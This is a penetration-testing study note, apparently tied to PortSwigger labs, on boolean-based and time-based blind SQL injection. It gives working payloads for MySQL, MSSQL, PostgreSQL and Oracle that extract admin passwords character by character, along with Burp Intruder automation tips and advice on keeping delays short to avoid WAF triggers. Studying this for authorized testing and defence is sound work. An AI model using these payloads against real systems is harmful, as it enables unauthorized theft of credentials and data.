# Blind SQL Injection — Boolean-Based & Time-Based

> Blind = the application gives you **zero direct feedback** about the query result.
> No error text, no extra rows in the response. You have to ask yes/no questions and
> infer the answer from some side-channel signal.

---

## PART A — Boolean-Based Blind SQLi

### A.1 Concept
You inject a condition that is either always true or always false, and observe a
**difference in the application's behavior** — different page content, different
HTTP status, presence/absence of an element, redirect vs no redirect.

### A.2 Confirming the Injection
```sql
' AND '1'='1     -- should behave normally (true)
' AND '1'='2     -- should behave differently (false)
```
If those two produce different responses, you have a working boolean-blind oracle.

### A.3 Extracting Data One Bit at a Time

**Step 1 — Confirm a table/column exists**
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

**Step 2 — Extract data character by character using SUBSTRING + ASCII**
```sql
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>109--
```
You binary-search the ASCII value (>109, <109, etc.) instead of brute-forcing every
character — this is what Burp Intruder automates for you.

**Step 3 — Automate with Burp Intruder**
- Cluster bomb / sniper attack with payload positions on the character index and the
  comparison value.
- Use **Grep - Match** on a string that only appears when the condition is true, then
  filter results by that match.

### A.4 Real-World Notes
- This is by far the slowest manual technique and the #1 reason `sqlmap` exists — on a
  real engagement you confirm boolean-blind manually (to prove exploitability for the
  report), then automate extraction.
- Watch for **subtle** differences: a missing CSS class, a slightly different word count,
  a cookie that's set only on success. Apps rarely give you an obvious "TRUE"/"FALSE" —
  you often have to diff two responses byte-for-byte.
- Login forms are the classic real-world boolean-blind target: "Invalid username" vs
  "Invalid password" message differences leak whether the username exists at all, before
  you even get into deeper injection.

### A.5 PortSwigger Labs (Boolean-blind track)
- Blind SQL injection with conditional responses
- Blind SQL injection with conditional errors
- Blind SQL injection with hidden data in HTTP headers (boolean-style detection via header)

---

## PART B — Time-Based Blind SQLi

### B.1 Concept
When there's **no visible difference at all** (same response, same status, same length),
you force the database to pause for N seconds when a condition is true, and measure
response time.

### B.2 Payloads by Engine
```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--

-- MSSQL
'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle (sleep is harder; commonly use heavy queries instead of DBMS_LOCK.SLEEP)
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(DBMS_UTILITY.GET_TIME) ELSE NULL END FROM dual)--
```

### B.3 Detecting Injection in the First Place (when totally blind)
```sql
' AND SLEEP(5)--      -- if the response takes 5s longer, injection confirmed
1' OR SLEEP(5)='0
```

### B.4 Real-World Notes
- Time-based is your fallback when boolean differences are too subtle to reliably detect,
  but it's noisy and slow on a live target — minimize sleep duration (2–3s) to avoid
  flooding logs/WAF triggers, and always note the network's baseline latency first so you
  don't misread normal jitter as a TRUE condition.
- Be careful with thread concurrency in Burp Intruder when doing time-based — concurrent
  requests can pile up DB load and produce false positives/negatives. Reduce
  thread count for time-based attacks specifically.
- Out-of-band channels (next file) exist exactly because time-based extraction is
  painfully slow for large datasets in the real world — this is why OOB is preferred
  whenever the environment allows DNS/HTTP egress.

### B.5 PortSwigger Labs (Time-based track)
- Blind SQL injection with time delays
- Blind SQL injection with time delays and information retrieval

---

## C. Detection Flow Summary

```
Inject ' or other breaking char
   │
   ├── Response changes visibly? ──► Boolean-based
   │
   ├── No visible change, but delay when forced? ──► Time-based
   │
   └── No visible change, no delay possible? ──► Try Out-of-Band (next file)
```

Continue to → `03_OutOfBand_SQLi.md`
